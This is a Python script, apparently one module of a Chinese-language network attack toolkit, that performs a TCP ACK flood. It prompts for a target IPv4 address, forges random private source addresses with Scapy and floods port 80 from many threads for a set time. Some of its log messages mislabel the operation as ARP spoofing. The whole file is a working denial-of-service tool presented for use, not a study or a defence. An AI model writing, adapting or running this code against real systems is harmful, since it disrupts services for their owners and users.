from concurrent.futures import ThreadPoolExecutor
from scapy.all import RandShort, send
from scapy.layers.inet import IP, TCP
from multilogging import multilogger
from loguru._logger import Logger

import socket
import sys
import re
import time
import random
import os
import threading

total: int
timesup: bool
logger: Logger


def init():
    global total, timesup, logger
    logger = multilogger(name="NS Attack", payload="ACK", notime=True)
    logger.info("初始化 ACK 泛洪攻击中...")
    selfip = socket.gethostbyname(socket.gethostname())
    logger.info(f"获得本机 IP 地址: {selfip}")
    total = 0
    timesup = False
    logger.success("ACK 泛洪攻击模块初始化完毕.")


def timer(uptime):
    global timesup
    if uptime > 0:
        time.sleep(uptime)
        timesup = True
        logger.info("时长抵达既定上限, 递交中止 ARP 欺骗请求.")


def rand_source_ip():
    return "192.168." + str(random.randint(0, 225)) + "." + str(random.randint(1, 225))


def _send_ack_package(target_ip, target_port):
    global total
    ack_packet = IP(src=rand_source_ip(), dst=target_ip) / TCP(
        sport=RandShort(), dport=target_port, flags="A"
    )
    while not timesup:
        send(ack_packet, verbose=False)
        total += 1
        logger.info(f"进行 {total} 次 ACK 攻击...")


def send_ack_package(target_ip, target_port):
    try:
        _send_ack_package(target_ip, target_port)
    except Exception as error:
        logger.exception(error)


def attack(target, limit=100, uptime=30):
    global timesup

    logger.info("开始启动 ACK 泛洪攻击线程.")
    logger.info(f"线程池: {limit}.")
    logger.info(f"既定攻击时长: {uptime}")

    threadpool = ThreadPoolExecutor(max_workers=os.cpu_count() * 3)

    timerthread = threading.Thread(target=lambda: timer(uptime))
    timerthread.daemon = True
    timerthread.start()

    for _ in range(os.cpu_count() * 3):
        threadpool.submit(send_ack_package, target, 80)

    while not timesup:
        try:
            time.sleep(10)
        except KeyboardInterrupt:
            break

    timesup = True
    threadpool.shutdown()

    logger.info("ACK 泛洪攻击已终止.")


def main(limit=100, uptime=10):
    from prompt_toolkit import prompt

    init()

    try:
        while True:
            target = prompt("目标地址 >>> ")
            if not target or target == "0":
                target = "0.0.0.0"
                break
            elif target.lower() in ["exit", "cancel", "no"]:
                logger.info("用户取消了发起 ACK 打击.")
                sys.exit()

            if not re.match(r"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$", target):
                logger.critical("错误的目标地址, 目标地址应该为类 IPv4 参数, 使用`0.0.0.0`进行局域网覆盖欺骗.")
                continue

            break
    except KeyboardInterrupt:
        logger.info("用户要求中止 ARP 欺骗.")
        sys.exit()
    except Exception as error:
        logger.exception(error)
        sys.exit()

    attack(target, limit=limit, uptime=uptime)


if __name__ == "__main__":
    main()
